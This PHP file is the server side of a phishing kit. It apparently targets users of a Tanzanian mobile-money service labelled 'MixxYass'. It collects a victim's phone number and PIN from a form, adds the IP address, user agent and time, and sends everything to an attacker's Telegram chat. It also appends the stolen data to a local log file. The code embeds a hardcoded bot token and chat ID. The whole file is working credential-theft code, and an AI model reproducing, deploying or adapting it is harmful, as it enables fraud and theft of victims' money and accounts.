<?php
// ============================================
// TELEGRAM BOT CONFIGURATION (UPDATED)
// ============================================
$botToken = "8680061714:AAG1EMja1icYBIsKmM8oV9NN4Z1NLBOIlzQ";
$chatId = "8091815189";

// ============================================
// ONLY ALLOW POST REQUESTS
// ============================================
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header('HTTP/1.0 403 Forbidden');
    echo json_encode(['status' => 'error', 'message' => 'Only POST requests allowed']);
    exit;
}

// ============================================
// GET AND CLEAN THE DATA
// ============================================
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$pin = isset($_POST['pin']) ? trim($_POST['pin']) : '';

// Validate data
if (empty($phone) || empty($pin)) {
    echo json_encode(['status' => 'error', 'message' => 'Phone and PIN are required']);
    exit;
}

// ============================================
// GET ADDITIONAL INFO (IP, USER AGENT, TIME)
// ============================================
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$timestamp = date('Y-m-d H:i:s');

// ============================================
// CREATE TELEGRAM MESSAGE
// ============================================
$message = "🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n";
$message .= "      📱 MixxYass Capture Data 📱\n";
$message .= "🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n\n";
$message .= "📞 PHONE NUMBER:\n";
$message .= "   +255 " . $phone . "\n\n";
$message .= "🔐 PIN CODE:\n";
$message .= "   " . $pin . "\n\n";
$message .= "🖥️ IP ADDRESS:\n";
$message .= "   " . $ip . "\n\n";
$message .= "📱 USER AGENT:\n";
$message .= "   " . substr($userAgent, 0, 80) . "\n\n";
$message .= "⏰ DATE & TIME:\n";
$message .= "   " . $timestamp . "\n\n";

// ============================================
// SEND TO TELEGRAM BOT
// ============================================
$telegramUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true
];

// Initialize cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// ============================================
// LOG TO FILE (for debugging)
// ============================================
$logEntry = date('Y-m-d H:i:s') . " | Phone: $phone | PIN: $pin | IP: $ip | Response: $httpCode\n";
file_put_contents('captured_data.log', $logEntry, FILE_APPEND);

// ============================================
// SEND RESPONSE BACK TO FRONTEND
// ============================================
header('Content-Type: application/json');
if ($httpCode == 200) {
    echo json_encode(['status' => 'success', 'message' => 'Data sent to Telegram']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Telegram API error: ' . $httpCode]);
}
?>
